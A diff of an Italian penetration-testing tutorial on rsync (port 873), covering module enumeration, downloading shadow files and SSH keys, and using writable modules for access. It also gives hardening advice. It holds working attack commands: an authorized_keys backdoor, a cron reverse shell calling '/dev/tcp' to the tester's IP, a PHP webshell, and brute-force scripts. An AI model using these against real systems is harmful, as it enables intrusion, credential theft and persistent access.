@@ -1,149 +1,145 @@
 ---
-title: 'Rsync Port 873: Come Enumerare Moduli, Scaricare File Sensibili e Ottenere Shell'
+title: 'Rsync Port 873: Enumeration, Anonymous Access e Exploitation'
 slug: rsync
-description: Rsync è un potente strumento per sincronizzare e trasferire file da terminale. Scopri come viene usato anche in attacchi interni per esfiltrazione dati.
+description: 'Pentest Rsync sulla porta 873: enumera rsyncd e moduli, verifica accesso anonimo e write access, analizza file esposti e possibili attack path.'
 image: /rsync.webp
 draft: false
 date: 2026-01-25T00:00:00.000Z
+lastmod: 2026-09-18T00:00:00.000Z
 categories:
   - networking
 subcategories:
   - protocolli
 tags:
   - rsync
-  - ''
+  - Rsyncd
+  - File Disclosure
+  - Moduli Rsync
 featured: true
 ---
 
-Trovi la porta 873 aperta durante una scansione. In dieci minuti puoi avere hash delle password, chiavi SSH private e — se il modulo è writable — accesso diretto al sistema. Questa guida copre tutto: dalla prima connessione al demone rsync fino alla shell.
+# Rsync Porta 873: Enumerazione, File Disclosure e Exploitation
 
-***
+Trovi la porta 873 aperta durante una scansione. A seconda di come sono configurati i moduli esposti, puoi arrivare a leggere file sensibili, scrivere dati sul target e — solo se il path scritto lo permette — ottenere accesso al sistema. Questa guida segue la catena reale: enumerazione del demone → moduli → accesso anonimo o autenticato → read/write → condizioni per trasformare la scrittura in accesso.
 
-## Cos'è il Demone Rsyncd e Perché è Pericoloso
+## Cos'è rsyncd e Perché la Porta 873 è Interessante
 
-Il demone `rsyncd` espone **moduli** — directory condivise configurate in `/etc/rsyncd.conf`. Ogni modulo può richiedere autenticazione oppure essere completamente aperto.
-
-La misconfig più comune: nessun `auth users`. Chiunque si connette legge (o scrive) senza credenziali.
-
-Esempio di configurazione vulnerabile:
+`rsync` è il programma client di sincronizzazione file; `rsyncd` è il demone che espone **moduli** — directory condivise definite in `/etc/rsyncd.conf` — tramite il protocollo rsync, tipicamente su TCP 873. Ogni modulo può richiedere autenticazione oppure no, ed essere in sola lettura o scrivibile: sono due impostazioni indipendenti, non un'unica opzione.
 
 ```ini
 [backup]
     path = /var/backup
     read only = yes
-    # nessun auth users = accesso anonimo
+    # nessun auth users → accesso senza credenziali
 
 [storage]
     path = /home/fox
     read only = no
-    # writable + anonimo = game over
+    # scrivibile + nessuna auth → superficie ampia, ma l'impatto dipende dal path
 ```
 
-***
+Un modulo privo di `auth users` può risultare accessibile senza credenziali — non è una garanzia assoluta in ogni build/configurazione, ma è la misconfig di gran lunga più comune. Verifica sempre il comportamento effettivo del demone, non darlo per scontato dalla sola config di esempio.
 
-## Come Enumerare i Moduli Rsync Esposti sulla Porta 873
-
-### Scan con nmap
-
-Usa [nmap](https://hackita.it/articoli/nmap/) per confermare il servizio e listare i moduli esposti:
+## Enumerare i Moduli Esposti
 
 ```bash
 nmap -sV -sC -p 873 <target>
 ```
 
-Output atteso:
-
-```
+```text
 873/tcp open  rsync   (protocol version 31)
 | rsync-list-modules:
 |   backup    Daily system backup
 |   www       Web document root
 ```
 
-### Lista moduli senza autenticazione
+Lista moduli senza credenziali:
 
 ```bash
 rsync rsync://<target>/
 ```
 
-Se risponde senza chiedere password: accesso anonimo confermato.
+Se risponde con l'elenco invece di chiedere una password, l'accesso anonimo alla lista moduli è confermato — non ancora l'accesso al contenuto di ciascuno, quello va verificato modulo per modulo.
 
-### Contenuto del modulo
+Contenuto di un modulo specifico:
 
 ```bash
 rsync -av --list-only rsync://<target>/backup/
 ```
 
-Filtra subito i file interessanti:
+Filtra subito per file interessanti:
 
 ```bash
 rsync -av --list-only rsync://<target>/backup/ | grep -iE "shadow|id_rsa|\.conf|\.key|secret"
 ```
 
-***
-
-## Come Scaricare File Sensibili da un Modulo Rsync Anonimo
-
-### File singolo
+## File Disclosure
 
 ```bash
 rsync -av rsync://<target>/backup/etc/shadow /tmp/shadow
 rsync -av rsync://<target>/backup/root/.ssh/id_rsa /tmp/root_key
 ```
 
-### Intero modulo
+Modulo intero:
 
 ```bash
 rsync -av rsync://<target>/backup/ /tmp/dump/
 ```
 
-**Cosa fai con quello che hai:**
-
-* `shadow` → crack con [hashcat](https://hackita.it/articoli/hashcat/): `hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt`
-* `id_rsa` → `chmod 600 /tmp/root_key && ssh -i /tmp/root_key root@<target>`
-* `rsyncd.secrets` → password per i moduli protetti
-
-***
-
-## Come Verificare se un Modulo Rsync è Writable
+**`shadow`** contiene password hash — non "hash delle password" genericamente, il formato va identificato prima di craccare. `1800` in [hashcat](https://hackita.it/articoli/hashcat/) è specifico per SHA-512 crypt: se il modulo target usa un algoritmo diverso, quel mode non funziona.
 
 ```bash
-echo "test" > /tmp/test.txt
+hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt
+```
+
+**`id_rsa`** — se la chiave non è protetta da passphrase, è direttamente utilizzabile:
+
+```bash
+chmod 600 /tmp/root_key && ssh -i /tmp/root_key root@<target>
+```
+
+**`rsyncd.secrets`** — se leggibile, contiene le credenziali per i moduli protetti.
+
+## Moduli Writable: Cosa Significa Davvero
+
+`read only = no` indica che il client può scrivere nel modulo — non implica automaticamente RCE o accesso al sistema. L'impatto reale dipende interamente da dove scrivi:
+
+| Destinazione mappata                | Impatto possibile                                                                         |
+| ----------------------------------- | ----------------------------------------------------------------------------------------- |
+| Directory di backup generica        | Overwrite/disclosure di file, poco altro                                                  |
+| Home directory di un utente         | Possibile path verso accesso SSH, se le condizioni sotto sono vere                        |
+| Web root servita da un web server   | Possibile modifica di contenuti applicativi, se il server esegue il tipo di file caricato |
+| Directory cron (`/etc/cron.d`)      | Possibile esecuzione, se cron è attivo e il file rispetta il formato atteso               |
+| Directory arbitraria senza uso noto | Dipende interamente dai permessi effettivi sul filesystem                                 |
+
+**Verifica reale della scrittura** — un `--dry-run` riuscito non dimostra che la scrittura sia realmente possibile: simula solo come rsync pianificherebbe l'operazione, non la esegue.
+
+```bash
 rsync -av --dry-run /tmp/test.txt rsync://<target>/storage/
 ```
 
-Se non ricevi `ERROR: module is read only` → puoi scrivere.
-
-***
-
-## Come Caricare una SSH Key su Rsync per Accesso Persistente
-
-Se il modulo mappa una home directory:
+Per una verifica reale, scrivi un file di test innocuo e conferma che compaia effettivamente nel listing:
 
 ```bash
-# 1. genera chiave
+rsync -av /tmp/test.txt rsync://<target>/storage/
+rsync -av --list-only rsync://<target>/storage/ | grep test.txt
+```
+
+## Attack Path: da Modulo Writable a SSH
+
+```bash
 ssh-keygen -f /tmp/backdoor -N ""
-
-# 2. crea .ssh in locale (cartella vuota)
 mkdir /tmp/.ssh
-
-# 3. carica la cartella sul target
 rsync -av /tmp/.ssh/ rsync://<target>/storage/.ssh/
-
-# 4. carica la chiave come authorized_keys
 rsync -av /tmp/backdoor.pub rsync://<target>/storage/.ssh/authorized_keys
-
-# 5. connettiti
 ssh -i /tmp/backdoor fox@<target>
 ```
 
-> **Nota:** se la versione remota di rsync è vecchia, `--mkpath` non funziona. Devi caricare prima la cartella vuota, poi il file — nell'ordine esatto sopra.
+Funziona solo se **tutte** queste condizioni sono vere: il path del modulo corrisponde davvero alla home dell'utente target, la scrittura arriva con ownership e permessi compatibili con quello che `sshd` accetta per `authorized_keys` (spesso richiede che il file non sia scrivibile da altri e appartenga all'utente giusto), e il servizio SSH è raggiungibile con quell'account. Se anche una di queste manca, la chiave viene scritta ma non usata.
 
-***
+Nota sull'ordine: se la versione remota di rsync è vecchia, `--mkpath` può non funzionare — carica prima la cartella vuota, poi il file, nell'ordine mostrato sopra.
 
-## Reverse Shell via Crontab su Modulo Rsync Writable
-
-Se il modulo ha accesso a `/etc/cron.d/`:
+## Attack Path: da Modulo Writable a Reverse Shell via Cron
 
 ```bash
 echo "* * * * * root bash -i >& /dev/tcp/<tuo_ip>/9001 0>&1" > /tmp/evil_cron
@@ -152,9 +148,9 @@ rsync -av /tmp/evil_cron rsync://<target>/backup/etc/cron.d/persistence
 
 Listener: `nc -lvnp 9001`
 
-***
+Condizioni necessarie: il modulo deve mappare realmente `/etc/cron.d` (o una directory equivalente letta da cron), la scrittura deve avere permessi che cron accetta di eseguire, e il demone cron deve essere attivo e raggiungere effettivamente quella directory. Senza queste, il file resta scritto e inerte.
 
-## Webshell su Rsync con Modulo che Mappa il Web Root
+## Attack Path: da Modulo Writable a Webshell
 
 ```bash
 echo '<?php system($_GET["c"]); ?>' > /tmp/cmd.php
@@ -162,95 +158,65 @@ rsync -av /tmp/cmd.php rsync://<target>/www/cmd.php
 curl "http://<target>/cmd.php?c=id"
 ```
 
-***
+Funziona solo se il path del modulo coincide davvero con una web root servita da un web server attivo e quel server interpreta PHP — caricare il file da solo non produce nulla se manca una di queste due condizioni.
 
-## Brute Force su Modulo Rsync Protetto da Password
+## Moduli Autenticati
+
+Se un modulo richiede password, verifica prima se hai già credenziali raccolte in altre fasi dell'assessment (riuso password, `rsyncd.secrets` trovato altrove) prima di passare al brute force:
 
 ```bash
 nmap -p 873 --script rsync-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
 ```
 
-Loop manuale con password comuni:
+`@ERROR: auth failed` non significa automaticamente "serve brute force": puoi aver sbagliato username, nome modulo, o la password è semplicemente diversa da quelle testate finora — conferma prima gli altri fattori.
 
-```bash
-for pass in "" backup rsync admin password 123456; do
-  RSYNC_PASSWORD="$pass" rsync rsync://backup@<target>/private/ 2>/dev/null && echo "TROVATA: $pass" && break
-done
-```
+## Troubleshooting
 
-***
+| Errore                   | Causa probabile                                                  | Verifica                                                            |
+| ------------------------ | ---------------------------------------------------------------- | ------------------------------------------------------------------- |
+| Connection refused       | rsyncd non in ascolto sulla porta standard                       | `nmap -p- <target>` per porte custom                                |
+| `@ERROR: auth failed`    | Credenziali richieste e non valide (o username/modulo sbagliato) | Riconferma nome modulo e formato credenziali prima di brute-forzare |
+| `@ERROR: Unknown module` | Nome modulo errato                                               | `rsync rsync://<target>/` per la lista corretta                     |
+| `read only`              | Il modulo non è scrivibile                                       | Prova altri moduli, non forzare quello                              |
+| `change_dir failed`      | La directory di destinazione non esiste sul target               | Carica prima la cartella, poi il file                               |
 
-## Post-Exploitation: Cosa Fare Dopo la Shell
+## Post-Exploitation
 
-Una volta dentro, usa [LinPEAS](https://hackita.it/articoli/linpeas/) per enumerare il sistema e trovare vettori di privilege escalation.
+Una volta ottenuta una shell, l'enumerazione locale segue lo stesso schema di qualsiasi altro foothold Linux — vedi [LinPEAS](https://hackita.it/articoli/linpeas/) per l'enumerazione automatica dei vettori di privilege escalation. Non è specifico di rsync, quindi non lo duplico qui.
 
-***
+## Hardening
+
+* `auth users` + `secrets file` su ogni modulo esposto.
+* `read only = yes` come default, scrivibile solo dove serve davvero.
+* `hosts allow` per limitare gli IP autorizzati a raggiungere il demone.
+* Logging in `/var/log/rsyncd.log` con monitoraggio attivo su listing e trasferimenti anomali.
+* Dove possibile, sostituisci rsyncd con rsync over SSH (`rsync -e ssh`), che elimina il protocollo non autenticato sulla 873.
 
 ## Attack Chain Completa
 
-| Fase           | Comando                                                         |
-| -------------- | --------------------------------------------------------------- |
-| Scan           | `nmap -sV -sC -p 873 <target>`                                  |
-| Lista moduli   | `rsync rsync://<target>/`                                       |
-| Contenuto      | `rsync -av --list-only rsync://<target>/<mod>/`                 |
-| Download file  | `rsync -av rsync://<target>/<mod>/etc/shadow /tmp/`             |
-| Test write     | `rsync -av --dry-run test.txt rsync://<target>/<mod>/`          |
-| Upload SSH key | `rsync -av key.pub rsync://<target>/<mod>/.ssh/authorized_keys` |
-| SSH            | `ssh -i backdoor user@<target>`                                 |
+| Fase                       | Comando                                                                   |
+| -------------------------- | ------------------------------------------------------------------------- |
+| Discovery                  | `nmap -sV -sC -p 873 <target>`                                            |
+| Enumerazione moduli        | `rsync rsync://<target>/`                                                 |
+| Contenuto modulo           | `rsync -av --list-only rsync://<target>/<mod>/`                           |
+| File disclosure            | `rsync -av rsync://<target>/<mod>/path/file /tmp/`                        |
+| Verifica scrittura reale   | `rsync -av test.txt rsync://<target>/<mod>/` + `--list-only` per conferma |
+| Attack path (SSH/cron/web) | Solo se le condizioni della sezione corrispondente sono verificate        |
 
-***
+## FAQ
 
-## Errori Comuni su Rsync e Come Risolverli
+**Qual è la differenza tra rsync e rsyncd?**
+`rsync` è l'utility client di sincronizzazione, `rsyncd` è il demone server che espone moduli via rete, tipicamente su TCP 873.
 
-| Errore                   | Causa                           | Fix                                   |
-| ------------------------ | ------------------------------- | ------------------------------------- |
-| Connection refused       | rsyncd non attivo               | Cerca porta custom con `nmap -p-`     |
-| `@ERROR: auth failed`    | Password richiesta              | Brute force o password comuni         |
-| `@ERROR: Unknown module` | Nome sbagliato                  | Lista con `rsync rsync://<target>/`   |
-| `read only`              | Modulo non writable             | Prova altri moduli                    |
-| `change_dir failed`      | Directory non esiste sul target | Carica prima la cartella, poi il file |
+**Un modulo rsync writable significa RCE garantito?**
+No. Significa solo che puoi scrivere nel path mappato dal modulo — l'impatto dipende interamente da cosa consuma quel path (cron, web server, home SSH) e dalle condizioni descritte nelle sezioni sopra.
 
-***
+**`--dry-run` riuscito prova che posso scrivere davvero?**
+No, simula solo il piano dell'operazione. Per una prova reale devi scrivere un file di test e confermarne la presenza con `--list-only`.
 
-## Come Proteggere Rsync dalla Porta 873
-
-* `auth users` e `secrets file` su ogni modulo
-* `read only = yes` di default
-* `hosts allow` per limitare gli IP autorizzati
-* Log in `/var/log/rsyncd.log` con monitoraggio attivo
-* Soluzione definitiva: disabilita rsyncd, usa rsync over SSH (`rsync -e ssh`)
-
-***
-
-## Cheat Sheet Rsync Pentest
-
-```bash
-# enumera moduli
-rsync rsync://<target>/
-
-# lista contenuto modulo
-rsync -av --list-only rsync://<target>/<mod>/
-
-# scarica file singolo
-rsync -av rsync://<target>/<mod>/path/file /tmp/
-
-# scarica intero modulo
-rsync -av rsync://<target>/<mod>/ /tmp/dump/
-
-# test scrittura
-rsync -av --dry-run test.txt rsync://<target>/<mod>/
-
-# upload file
-rsync -av file rsync://<target>/<mod>/path/
-
-# con password
-RSYNC_PASSWORD=pass rsync rsync://user@<target>/<mod>/
-```
+**Rsyncd può portare a una shell?**
+Sì, ma non direttamente: serve un path scrivibile che finisca in un posto sfruttabile (home SSH, cron, web root) con permessi coerenti — nessuno di questi è garantito dal solo fatto che il modulo sia writable.
 
 ***
 
 Uso esclusivo in ambienti autorizzati.
-
-Se questo articolo ti è stato utile e vuoi supportare HackIta, puoi farlo qui: [hackita.it/supporto](https://hackita.it/supporto)
-
-Se vuoi fare sul serio — formazione 1:1, lab guidati o far testare la tua azienda — trovi tutto qui: [hackita.it/servizi](https://hackita.it/servizi)
